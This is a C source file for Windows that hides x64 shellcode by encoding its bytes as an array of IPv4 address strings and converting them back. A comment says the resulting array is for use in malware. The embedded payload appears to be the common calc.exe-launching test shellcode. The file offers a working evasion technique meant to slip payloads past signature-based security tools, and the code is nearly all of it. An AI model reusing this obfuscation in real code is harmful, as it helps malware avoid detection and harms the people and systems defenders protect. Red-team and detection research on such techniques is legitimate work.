#include "Windows.h"
#include "stdio.h"
#include "ip2string.h"

void printBuffer(PBYTE buf, DWORD size) {
	for (int i = 0; i < size; i++) {
		printf("\\x%0.2x", buf[i]);
	}
	printf("\n");
}

void printArrayOfIpv4Addresses(PBYTE ipv4AddrStrArr, DWORD ipv4AddressesNum, BOOL forCode) {
	if (forCode) {
		printf("char ipv4AddrStrArr[][16] = {");

		for (int i = 0; i < ipv4AddressesNum; i++) {
			printf("\"%s\",", (ipv4AddrStrArr + (i * 16)));
		}

		printf("};\n");
	}
	else {
		for (int i = 0; i < ipv4AddressesNum; i++) {
			printf("%s, ", (ipv4AddrStrArr + (i * 16)));
			printf("\n");
		}
	}
}

void ipv4Obfuscate(IN PBYTE pBuf, IN DWORD bufSize, OUT DWORD* ipv4AddressesNum, OUT PBYTE *ipv4AddrStrArr) {
	BYTE ipv4Addr[4] = {0,0,0,0};
	unsigned char ipv4AddrStr[16];
	*ipv4AddressesNum = ((bufSize / 4) + (bufSize % 4 != 0 ? 1 : 0));
	*ipv4AddrStrArr = malloc(16 * (*ipv4AddressesNum));

	for (int i = 0, j = 0; i < bufSize; i++, j = ((j + 1) % 4)) {
		ipv4Addr[j] = pBuf[i];

		// When 4 octects have been fulfilled
		if (j == 3 || i == bufSize - 1) {
			// Pad NOPs to pad if necessary
			if (j != 3) {
				for (int k = bufSize % 4; k < 4; k++) {
					ipv4Addr[k] = 0x90;
				}
			}
			
			// Convert byte array to string IPv4 address
			memset(ipv4AddrStr, 0, 16);
			sprintf_s(ipv4AddrStr, 16, "%d.%d.%d.%d", ipv4Addr[0], ipv4Addr[1], ipv4Addr[2], ipv4Addr[3]);

			// Store string IPv4 address
			memcpy_s((*ipv4AddrStrArr + (16 * (i / 4))), 16, ipv4AddrStr, 16);
		}
	}
}

int strToInt(char* str, int strLen, char* delim) {
	int power = 1;
	int integer = 0;
	const int delimAscii = (int)(*delim);
	const int zeroAscii = (int)(*"0");

	for (int l = strLen - 1; l >= 0; l--) {
		char curr = str[l];
		// If current character is not delimiter, consider it part of integer
		if ((int)curr != delimAscii) {
			integer = integer + (((int)curr - zeroAscii) * power);

			// Increase power for decimal calculation
			power = power * 10;
		}
	}
	// integer now is the decimal equivalent of the octet
	return integer;
}

PBYTE ipv4Deobfuscate(IN DWORD ipv4AddressesNum, IN PBYTE ipv4AddrStrArr, OUT PBYTE* payload) {
	char octetStr[3] = "AAA";
	const int dotAscii = (int)(*".");
	const int AAscii = (int)(*"A");

	*payload = malloc(ipv4AddressesNum * 4);

	for (int i = 0, oi = 0; i < ipv4AddressesNum; i++) {
		char* ipv4AddrStr = ipv4AddrStrArr + (16 * i);
		
		// Go through ipv4AddrStr, extract each octect, convert to integer
		for (int j = 0, k = 0; j < 16; j++) {
			char curr = ipv4AddrStr[j];

			// If current character is "." or "\0", the octet has ended
			if ((int)curr == dotAscii || (int)curr == 0) {
				unsigned char octetInt = strToInt(octetStr, 3, "A");
				
				*(*payload + oi) = (UINT8)octetInt;
				oi++;

				// If it's the end of the ipv4 string, break
				if ((int)curr == 0) {
					break;
				}
				else {
					// Reset octet string
					memset(octetStr, AAscii, 3);
					k = 0;
				}
			}
			// If current character is not a ".", add to octet string.
			else {
				octetStr[k] = curr;
				k++;
			}
		}
	}
}

void main() {
	// Payload to encode
	unsigned char payload[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
	DWORD payloadSize = 276;
	
	printf("Original buffer:\n");
	printBuffer(payload, payloadSize);
	

	// Obfuscate into array of IPV4 strings
	DWORD ipv4AddressesNum;
	PBYTE ipv4AddrStrArr;
	ipv4Obfuscate(payload, payloadSize, &ipv4AddressesNum, &ipv4AddrStrArr);

	// Get array to IPv4 strings to use in malware
	printf("\nObfuscated IPv4 address array:\n");
	printArrayOfIpv4Addresses(ipv4AddrStrArr, ipv4AddressesNum, TRUE);

	// Deobfuscate back into array of bytes
	char ipv4AddrStrArrDerived[][16] = {"252.72.131.228","240.232.192.0","0.0.65.81","65.80.82.81","86.72.49.210","101.72.139.82","96.72.139.82","24.72.139.82","32.72.139.114","80.72.15.183","74.74.77.49","201.72.49.192","172.60.97.124","2.44.32.65","193.201.13.65","1.193.226.237","82.65.81.72","139.82.32.139","66.60.72.1","208.139.128.136","0.0.0.72","133.192.116.103","72.1.208.80","139.72.24.68","139.64.32.73","1.208.227.86","72.255.201.65","139.52.136.72","1.214.77.49","201.72.49.192","172.65.193.201","13.65.1.193","56.224.117.241","76.3.76.36","8.69.57.209","117.216.88.68","139.64.36.73","1.208.102.65","139.12.72.68","139.64.28.73","1.208.65.139","4.136.72.1","208.65.88.65","88.94.89.90","65.88.65.89","65.90.72.131","236.32.65.82","255.224.88.65","89.90.72.139","18.233.87.255","255.255.93.72","186.1.0.0","0.0.0.0","0.72.141.141","1.1.0.0","65.186.49.139","111.135.255.213","187.240.181.162","86.65.186.166","149.189.157.255","213.72.131.196","40.60.6.124","10.128.251.224","117.5.187.71","19.114.111.106","0.89.65.137","218.255.213.99","97.108.99.46","101.120.101.0",}; // derived from "printArrayOfIpv4Addresses"

	PBYTE payloadDeobfuscated = NULL;
	ipv4Deobfuscate(ipv4AddressesNum, ipv4AddrStrArrDerived, &payloadDeobfuscated);

	printf("\nDeobfuscated buffer:\n");
	printBuffer(payloadDeobfuscated, payloadSize);

	// Cleanup
	free(ipv4AddrStrArr);
}